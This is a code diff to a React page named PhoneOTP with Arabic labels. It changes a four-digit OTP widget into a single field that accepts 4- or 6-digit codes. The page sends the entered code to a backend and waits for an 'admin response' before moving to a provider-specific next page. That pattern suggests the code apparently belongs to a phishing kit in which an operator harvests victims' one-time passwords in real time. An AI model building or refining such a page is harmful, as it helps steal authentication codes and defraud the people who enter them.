@@ -3,11 +3,7 @@ import { useLocation, useSearch } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
+import { Input } from "@/components/ui/input";
 import {
   sendData,
   isFormApproved,
@@ -35,6 +31,9 @@ export default function PhoneOTP() {
   const inputRef = useRef<HTMLInputElement>(null);
 
   const nextPage = serviceProviderNextPages[serviceProvider] || "الصفحة النهائية";
+
+  // التحقق من أن الرمز 4 أو 6 أرقام
+  const isValidOtp = otp.length === 4 || otp.length === 6;
 
   // Emit page enter
   useEffect(() => {
@@ -66,7 +65,7 @@ export default function PhoneOTP() {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (otp.length !== 4) {
+    if (!isValidOtp) {
       setError(true);
       return;
     }
@@ -86,6 +85,14 @@ export default function PhoneOTP() {
       current: "تحقق رقم الجوال (OTP)",
       waitingForAdminResponse: true,
     });
+  };
+
+  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, ""); // فقط الأرقام
+    if (value.length <= 6) {
+      setOtp(value);
+      setError(false);
+    }
   };
 
   return (
@@ -117,23 +124,22 @@ export default function PhoneOTP() {
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-6">
-          {/* OTP Input */}
+          {/* OTP Input - خانة واحدة */}
           <div className="flex justify-center" dir="ltr">
-            <InputOTP
-              maxLength={4}
+            <Input
+              ref={inputRef}
+              type="text"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              maxLength={6}
               value={otp}
-              onChange={(value) => {
-                setOtp(value);
-                setError(false);
-              }}
-            >
-              <InputOTPGroup>
-                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
-              </InputOTPGroup>
-            </InputOTP>
+              onChange={handleOtpChange}
+              placeholder="أدخل رمز التحقق"
+              className={`text-center text-2xl tracking-widest h-14 max-w-[200px] ${
+                error ? "border-red-500 focus:border-red-500" : ""
+              }`}
+              autoComplete="one-time-code"
+            />
           </div>
 
           {error && (
@@ -142,8 +148,13 @@ export default function PhoneOTP() {
             </p>
           )}
 
-          {/* Submit Button */}
-          <Button type="submit" className="w-full" size="lg">
+          {/* Submit Button - معطل حتى يتم تعبئة الرمز */}
+          <Button 
+            type="submit" 
+            className="w-full" 
+            size="lg"
+            disabled={!isValidOtp}
+          >
             تأكيد
           </Button>
 
